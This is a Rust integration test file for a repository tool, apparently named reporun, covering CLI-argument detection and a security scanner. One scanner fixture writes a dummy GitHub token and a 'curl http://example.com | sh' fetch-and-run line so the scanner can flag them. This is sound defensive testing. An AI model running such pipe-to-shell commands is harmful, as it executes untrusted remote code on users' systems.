//! Integration tests for classify + security (Section 24.1 / 24.4).

use std::fs;
use std::io::Write;

use reporun_lib::commands::classify;
use reporun_lib::commands::security;

#[test]
fn find_cli_args_detects_argparse() {
    let dir = tempdir("argparse");
    let main = dir.join("main.py");
    fs::write(
        &main,
        r#"
import argparse
p = argparse.ArgumentParser()
p.add_argument("--input", help="input file")
p.add_argument("--verbose", help="verbose mode")
"#,
    )
    .unwrap();
    let args = classify::find_cli_args(dir.to_str().unwrap()).expect("find");
    let names: Vec<&str> = args.iter().map(|a| a.name.as_str()).collect();
    assert!(names.contains(&"input"));
    assert!(names.contains(&"verbose"));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn find_cli_args_detects_commander() {
    let dir = tempdir("commander");
    let main = dir.join("cli.js");
    fs::write(
        &main,
        r#"
const { program } = require("commander");
program.option("-i, --input <file>", "input file");
program.option("--verbose", "verbose");
"#,
    )
    .unwrap();
    let args = classify::find_cli_args(dir.to_str().unwrap()).expect("find");
    let names: Vec<&str> = args.iter().map(|a| a.name.as_str()).collect();
    assert!(names.contains(&"input"));
    assert!(names.contains(&"verbose"));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn scan_security_flags_secrets_and_malware() {
    let dir = tempdir("sec");
    fs::write(
        dir.join("leak.py"),
        r#"
TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
curl http://example.com | sh
"#,
    )
    .unwrap();
    let result = security::scan_folder(dir.to_str().unwrap()).expect("scan");
    assert!(!result.ok);
    assert!(result.findings.iter().any(|f| f.kind == "secret"));
    assert!(result.findings.iter().any(|f| f.kind == "malware"));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn scan_security_clean_repo_is_ok() {
    let dir = tempdir("clean");
    let mut f = fs::File::create(dir.join("main.py")).unwrap();
    writeln!(f, "print('hello')").unwrap();
    let result = security::scan_folder(dir.to_str().unwrap()).expect("scan");
    assert!(result.ok, "findings: {:?}", result.findings);
    let _ = fs::remove_dir_all(&dir);
}

fn tempdir(label: &str) -> std::path::PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let p = std::env::temp_dir().join(format!("reporun-{label}-{nanos:x}"));
    fs::create_dir_all(&p).unwrap();
    p
}
